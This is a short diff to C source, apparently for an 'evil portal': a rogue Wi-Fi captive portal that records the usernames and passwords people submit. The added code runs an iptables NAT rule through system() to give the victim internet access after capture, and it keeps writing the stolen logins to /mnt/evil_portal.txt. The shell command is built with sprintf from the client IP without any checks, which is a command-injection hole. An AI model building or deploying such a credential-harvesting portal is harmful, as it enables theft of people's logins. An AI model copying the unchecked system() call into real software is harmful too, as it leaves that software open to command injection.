@@ -53,8 +53,14 @@ void redirect_user(int client_socket) {
 void handle_login(int client_socket, char* body, const char* client_ip) {
     char* username = NULL;
     char* password = NULL;
+    char cmd[256];
 
-    FILE *file = fopen("evil_portal.txt", "a");
+    // You shall pass
+    sprintf(cmd, "iptables -t nat -A POSTROUTING -o $INET_NIC -s %s -j MASQUERADE", client_ip);
+    system(cmd);
+
+    // Keep your shit
+    FILE *file = fopen("/mnt/evil_portal.txt", "a");
     if (file == NULL) {
         printf("Error opening file.\n");
         return;
